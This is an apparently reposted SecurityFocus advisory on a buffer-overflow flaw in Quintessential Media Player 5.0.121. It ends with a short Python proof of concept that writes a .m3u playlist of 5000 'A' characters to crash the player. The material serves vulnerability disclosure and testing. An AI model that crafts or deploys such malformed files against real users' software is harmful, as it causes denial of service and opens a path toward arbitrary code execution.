source: http://www.securityfocus.com/bid/42307/info

Quintessential Media Player is prone to a buffer-overflow vulnerability because it fails to perform adequate boundary checks on user-supplied data.

Attackers may leverage this issue to execute arbitrary code in the context of the application. Failed attacks will cause denial-of-service conditions.

Quintessential Media Player 5.0.121 is vulnerable; other versions may also be affected.

#Quintessential Player 5.0.121 .m3u Crash POC
#vulnerble application link http://www.quinnware.com/downloads.php
#tested on XP SP2/3
#author abhishek lyall - abhilyall[at]gmail[dot]com
#web::: http://aslitsecurity.com  Blog::: http://aslitsecurity.blogspot.com
#!/usr/bin/python

filename = "Quintessential.m3u"


junk = "\x41" * 5000

textfile = open(filename , 'w')
textfile.write(junk)
textfile.close()